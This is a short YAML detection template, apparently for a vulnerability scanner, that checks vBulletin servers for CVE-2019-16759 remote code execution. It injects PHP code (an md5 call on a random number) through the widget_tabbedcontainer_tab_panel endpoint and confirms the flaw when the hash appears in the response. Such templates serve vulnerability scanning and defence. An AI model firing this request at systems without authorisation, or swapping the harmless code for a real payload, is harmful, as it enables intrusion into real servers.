name: poc-yaml-vbulletin-cve-2019-16759-rce
transport: http
set:
  s1: randomInt(100000, 999999)
rules:
  r0:
    request:
      method: POST
      path: /ajax/render/widget_tabbedcontainer_tab_panel
      follow_redirects: false
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: >-
        subWidgets[0][template]=widget_php&subWidgets[0][config][code]=md5({{s1}});
    expression: response.status == 200 && response.body_string.contains(md5(string(s1)))
expression: r0()
detail:
  author: Â∞èz
  links:
    - https://blog.exploitee.rs/2020/exploiting-vbulletin-a-tale-of-patch-fail/